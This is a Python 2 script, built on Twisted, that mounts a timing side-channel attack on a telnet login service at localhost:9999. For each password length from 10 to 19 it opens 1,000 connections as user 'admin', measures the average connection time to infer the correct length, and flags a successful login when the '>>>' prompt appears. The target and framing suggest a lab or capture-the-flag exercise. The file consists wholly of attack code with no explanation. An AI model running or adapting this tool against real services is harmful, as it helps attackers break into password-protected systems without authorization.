import operator
import time

from twisted.internet import defer, endpoints, protocol, reactor


class TelnetClient(protocol.Protocol):
    def __init__(self):
        self.start = time.time()
        self.done = defer.Deferred()


    def connectionMade(self):
        loginString = "admin\r\n{}\r\n".format(self.factory.password)
        self.transport.write(loginString)


    def dataReceived(self, data):
        if data.startswith(">>>"):
            raise Exception("Found password: {}".format(self.factory.password))


    def connectionLost(self, reason):
        self.done.callback(time.time() - self.start)



class TelnetClientFactory(protocol.ClientFactory):
    protocol = TelnetClient

    def __init__(self, password):
        self.password = password




SAMPLES = 1000
whenDone = operator.attrgetter("done")


def average(samples):
    return sum(samples) / len(samples)


@defer.inlineCallbacks
def findLength(endpoint, minLength, maxLength):
    measurements = {}

    for length in xrange(minLength, maxLength):
        measurements[length] = yield _sampleLength(endpoint, length)

    print sorted(measurements.items(), key=operator.itemgetter(1))


def _sampleLength(endpoint, length):
        factory = TelnetClientFactory("a" * length)

        ds = []
        for _ in xrange(SAMPLES):
            ds.append(endpoint.connect(factory).addCallback(whenDone))

        return defer.gatherResults(ds).addCallback(average)


if __name__ == '__main__':
    endpoint = endpoints.TCP4ClientEndpoint(reactor, "localhost", 9999)
    reactor.callLater(0, findLength, endpoint, 10, 20)
    reactor.run()
